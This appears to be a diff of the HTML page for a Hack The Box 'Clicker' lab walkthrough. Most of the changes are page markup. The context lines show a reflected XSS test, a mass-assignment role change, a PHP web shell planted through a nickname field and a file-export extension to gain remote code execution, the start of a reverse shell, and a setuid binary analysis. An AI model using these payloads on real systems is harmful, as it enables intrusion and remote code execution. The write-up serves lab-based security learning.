@@ -5,58 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Clicker - HTB</title>
     <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"></noscript>
     <link href="/css/styles.css" rel="stylesheet">
     <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <button class="sidebar-toggle" id="sidebarToggle"><i class="bi bi-list"></i></button>
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
             <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <img width="160" height="160" src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
+                    <span class="sidebar-role">Red Team Database</span>
                 </div>
                 <nav>
                     <ul class="nav-menu">   
                         <li class="nav-item">
                             <a href="/" class="nav-link">
-                                <i>🏠</i>
+                                <i class="bi bi-house-door"></i>
                                 <span>Home</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/articles" class="nav-link active">
-                                <i>📝</i>
+                                <i class="bi bi-journal-code"></i>
                                 <span>Articles</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/writeups" class="nav-link">
-                                <i>💻</i>
+                                <i class="bi bi-terminal"></i>
                                 <span>WriteUps</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/notes" class="nav-link">
-                                <i>📚</i>
+                                <i class="bi bi-folder2-open"></i>
                                 <span>Notes</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
-                                <i>⚡</i>
+                                <i class="bi bi-bug"></i>
                                 <span>KL-Sunset</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/about" class="nav-link">
-                                <i>👤</i>
+                                <i class="bi bi-person-badge"></i>
                                 <span>About me</span>
                             </a>
                         </li>
@@ -68,7 +72,7 @@
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img src="/writeups/htb/medium/clicker/img/clicker.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <img src="/writeups/htb/medium/clicker/img/clicker.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=elswix'">
                     <h2>Clicker - HTB</h2>
                     <p>walkthrough by elswixHackTheBox</p>
                 </section>
@@ -161,46 +165,46 @@ If we attempt to run <code>whatweb</code> again:<br/><br/>
 
 It works, and the domain is resolved properly.<br/><br/>
 When accessing the website via our browser, we encounter the following content:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/1.png"><br/><br/>
+<img width="1343" height="580" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/1.png"><br/><br/>
 There is an information section:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/2.png"><br/><br/>
+<img width="1344" height="580" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/2.png"><br/><br/>
 Here we can highlight three users: <code>ButtonLover99</code>, <code>Paol</code>, and <code>Th3Br0</code>.<br/><br/>
 There is also a login section:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/3.png"/><br/><br/>
+<img width="1348" height="586" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/3.png"/><br/><br/>
 I've tried the most common credentials, such as <code>admin:admin</code> and <code>guest:guest</code>, but they didn't work. I also attempted using the users we found as credentials, but it didn't work either.<br/><br/>
 When entering wrong credentials, this message is displayed:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/4.png"/><br/><br/>
+<img width="614" height="414" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/4.png"/><br/><br/>
 Looking at the URL, I realized that I can specify any message I want using the <code>?err=</code> parameter.<br/><br/>
 <div class="highlight"><pre><span></span><span class="err">http://clicker.htb/login.php?err=elswix</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/5.png"/><br/><br/>
+<img width="636" height="393" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/5.png"/><br/><br/>
 As any data I enter in this parameter is displayed in the response, I have tried to enter an XSS payload:<br/><br/>
 <div class="highlight"><pre><span></span><span class="err">http://clicker.htb/login.php?err=&lt;script&gt;alert(1)&lt;/script&gt;</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/6.png"/><br/><br/>
+<img width="471" height="163" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/6.png"/><br/><br/>
 It works, but at this point, it isn't useful.<br/><br/>
 There is also a <code>register</code> section:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/7.png"/><br/><br/>
+<img width="1345" height="582" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/7.png"/><br/><br/>
 When specifying new credentials, it displays the following message:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/8.png"/><br/><br/>
+<img width="501" height="249" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/8.png"/><br/><br/>
 When using these credentials in the <code>login</code> section, they work.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/9.png"/><br/><br/>
+<img width="609" height="492" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/9.png"/><br/><br/>
 While inspecting the requests made during the creation and login of an account, we come across new files:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/10.png"/><br/><br/>
+<img width="1097" height="147" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/10.png"/><br/><br/>
 When creating a new account, our data is transmitted to <code>create_player.php</code>, and during the sign-in process, our data is sent to <code>authenticate.php</code>.<br/><br/>
 Once we successfully log in, we can access the <code>profile</code> section:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/11.png"/><br/><br/>
+<img width="661" height="297" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/11.png"/><br/><br/>
 The displayed information includes my username, clicks, and level. It appears that this website functions as an online video game with points and levels.<br/><br/>
 There is also a <code>play</code> section, where we see the following content:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/12.png"/><br/><br/>
+<img width="1324" height="534" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/12.png"/><br/><br/>
 Here is the video game, and we can play it. When clicking on <code>Save and close</code>, the following request is made:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/13.png"/><br/><br/>
+<img width="662" height="280" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/13.png"/><br/><br/>
 I entered the following values into the <code>clicks</code> and <code>level</code> parameters and re-sent the request.<br/><br/>
 <div class="highlight"><pre><span></span><span class="err">/save_game.php?clicks=999999&amp;level=999999</span>
 </pre></div>
 
 The following response was returned, with the message <code>Game has been saved!</code><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/14.png"/><br/><br/>
+<img width="466" height="267" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/14.png"/><br/><br/>
 Upon accessing the <code>profile</code> section, I noticed that the values had changed this time.<br/><br/>
 I have concluded that, by saving the game, I am interacting with and passing values to columns in a database. This process could potentially be vulnerable to a Mass Assignment attack as well.<br/><br/>
 <h3><br/>NFS - Port 2049</h3><br/>
@@ -402,28 +406,28 @@ Let's test this. I will make the following request:<br/><br/>
 </pre></div>
 
 I URL-encoded the <code>/**/</code> characters to avoid errors:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/15.png"/><br/><br/>
+<img width="657" height="334" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/15.png"/><br/><br/>
 I got the following response:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/16.png"/><br/><br/>
+<img width="656" height="443" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/16.png"/><br/><br/>
 It appears to have worked. Initially, when loading the <code>/index.php</code> page, there were no immediate changes. However, after logging out and signing in again, the modifications became apparent.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/17.png"/><br/><br/>
+<img width="659" height="513" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/17.png"/><br/><br/>
 It worked properly, we successfully modified the <code>ROLE</code> attribute of our account.<br/><br/>
 <h3><br/>Shell as www-data</h3><br/>
 As admins, now we can access the <code>/admin.php</code> section:<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/18.png"/><br/><br/>
+<img width="720" height="438" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/18.png"/><br/><br/>
 Here, you can observe the top players on the page. Additionally, there is an "Export" button. <br/><br/>
 When clicking on it, the following request is made:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/19.png"/><br/><br/>
+<img width="528" height="456" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/19.png"/><br/><br/>
 And we see the following message in the response:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/20.png"/><br/><br/>
+<img width="674" height="198" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/20.png"/><br/><br/>
 When accessing to <code>exports/top_players_1smeg5dz.txt</code>, the following information is displayed:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/21.png"/><br/><br/>
+<img width="623" height="202" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/21.png"/><br/><br/>
 Upon examining the request, I found interesting the <code>extension</code> parameter:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/23.png"/><br/><br/>
+<img loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/23.png"/><br/><br/>
 Let's see what happens if I change it to <code>elswix</code>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/24.png"/><br/><br/>
+<img width="1057" height="436" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/24.png"/><br/><br/>
 We got a similiar response. This time the message returned gives us the path to a new file: <code>exports/top_players_8je0i15v.elswix</code><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/25.png"/><br/><br/>
+<img width="640" height="276" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/25.png"/><br/><br/>
 The "extension" parameter specifies the extension of the exported file. Upon inspecting the file content, we observed that it corresponds to the data from the database.  If we can manipulate the database (by exploiting the <code>save_profile</code> function) and control the extension of the exported file, we might be able to write a PHP file with malicious content.<br/><br/>
 The values recorded in the exported file include the nickname, clicks, and level. I plan to modify the <code>nickname</code> column, as the other columns appear to store integer values.<br/><br/>
 This will be the request to the <code>save_profile.php</code> file:<br/><br/>
@@ -432,32 +436,32 @@ This will be the request to the <code>save_profile.php</code> file:<br/><br/>
 
 This will change my nickname to <code>&lt;?php phpinfo(); ?&gt;</code>. <br/><br/>
 I URL-Encoded the payload to avoid errors:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/28.png"/><br/><br/>
+<img width="571" height="303" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/28.png"/><br/><br/>
 Before utilizing the export function, I will log in again.<br/><br/>
 Now I will use the export function passing <code>php</code> as the extension value:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/29.png"/><br/><br/>
+<img width="530" height="427" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/29.png"/><br/><br/>
 The response provides us a route to the exported file with the PHP extension:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/30.png"/><br/><br/>
+<img width="500" height="252" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/30.png"/><br/><br/>
 When loading the PHP file, our new nickname was interpreted:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/31.png"/><br/><br/>
+<img width="964" height="583" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/31.png"/><br/><br/>
 There are not disabled functions:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/32.png"/><br/><br/>
+<img width="961" height="159" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/32.png"/><br/><br/>
 This implies that we can leverage functions such as <code>system()</code>, <code>shell_exec()</code>, <code>popen()</code>, etc., enabling us to achieve Remote Code Execution (RCE) on the victim machine.<br/><br/>
 I will use the <code>shell_exec</code> function to get a webshell. This will be the request to the <code>save_profile.php</code> section:<br/><br/>
 <div class="highlight"><pre><span></span>GET /save_game.php?clicks=999999&amp;level=999999&amp;nickname=&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
 </pre></div>
 
 I URL-Encoded the payload to avoid problems:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/33.png"/><br/><br/>
+<img width="651" height="430" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/33.png"/><br/><br/>
 Before utilizing the export function, I will log in again.<br/><br/>
 Now I will use the export function passing <code>php</code> as the extension value:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/34.png"/><br/><br/>
+<img width="519" height="422" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/34.png"/><br/><br/>
 Once again, the response provides us a route to the exported file with the php extension:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/35.png"/><br/><br/>
+<img width="435" height="303" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/35.png"/><br/><br/>
 When accessing the new php file, we will see the following content:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/36.png"/><br/><br/>
+<img width="646" height="216" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/36.png"/><br/><br/>
 Nothing is being displayed; let's try to add the <code>cmd</code> GET parameter and specify <code>id</code>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/37.png"/><br/><br/>
+<img width="929" height="319" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/37.png"/><br/><br/>
 Finally, we have achieved Remote Code Execution (RCE) on the victim machine.<br/><br/>
 To gain access to the system, I will start a reverse shell with bash. Firstly I will create a malicious index.html file with the following content:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">cat</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span>
@@ -662,11 +666,11 @@ If I run this binary using <code>strace</code> (to gather information about the 
 It is attempting to access a file named <code>create.sql</code>, which is located in <code>/home/jack/queries</code>.<br/><br/>
 I was able to exploit this binary without using reverse engineering methods or tools like <code>ghidra</code>. However, for the write-up, I will explain how the binary works.<br/><br/>
 Let's launch Ghidra and analyze this binary on my local machine:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/38.png"/><br/><br/>
+<img width="1353" height="630" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/38.png"/><br/><br/>
 Firstly, it checks whether the program is executed with arguments:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/39.png"/><br/><br/>
+<img width="644" height="62" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/39.png"/><br/><br/>
 In the event that we execute the program with an argument, this happens:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/40.png"/><br/><br/>
+<img width="474" height="460" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/40.png"/><br/><br/>
 Firstly, it is defining the <code>iVar1</code> variable with the content of the first argument specified in the command line.<br/><br/>
 Then, the code dynamically allocates memory for a block of 20 bytes (0x14 in hexadecimal) using the <code>calloc</code> function. The allocated memory is initialized to zeros. The pointer <code>pcVar3</code> points to the first byte of this newly assigned memory.<br/><br/>
 Upon reaching the <code>switch()</code> statement, it examines the content of the first argument (stored in the <code>iVar1</code> variable).<br/><br/>
@@ -685,11 +689,11 @@ The code for cases 1, 2, 3, and 4 is similar. Let's examine what happens in the 
 </pre></div>
 
 Essentially, this implies that the value of the second parameter specified in the command line when launching the program is stored in <code>pcVar3</code>, which points to the block of 20 bytes defined using the <code>calloc</code> function. It's crucial to note that the second parameter must not exceed 20 bytes in length.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/42.png"/><br/><br/>
+<img width="446" height="161" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/42.png"/><br/><br/>
 It was a little challenging to comprehend this code due to the strings not being in plaintext. Essentially, the values of three variables, namely <code>local_98</code>, <code>local_90</code>, and <code>local_88</code>, correspond to the string <code>/home/jack/queries/</code>.<br/><br/>
 In summary, this code concatenates the string stored in the <code>pcVar3</code> variable with the <code>/home/jack/queries</code> string and stores the resulting string in the <code>__dest</code> variable. Subsequently, it uses the <code>setreuid()</code> function to set both the RUID (Real User Identifier) and EUID (Effective User Identifier) to 1000 (associated with user <code>Jack</code>). Finally, it checks if the file (whose location is stored in the <code>__dest</code> variable) is readable using the <code>access()</code> function. The value <code>4</code> corresponds to read privileges.<br/><br/>
 In the event that the file is readable, this happens:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/44.png"/><br/><br/>
+<img width="401" height="305" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/clicker/img/44.png"/><br/><br/>
 Once again, the strings are not in plain text, but these variables belong to the following command:<br/><br/>
 <div class="highlight"><pre><span></span>/usr/bin/mysql<span class="w"> </span>-u<span class="w"> </span>clicker_db_user<span class="w"> </span>--password<span class="o">=</span><span class="s1">'clicker_db_password'</span><span class="w"> </span>clicker<span class="w"> </span>-v<span class="w"> </span>&lt;
 </pre></div>
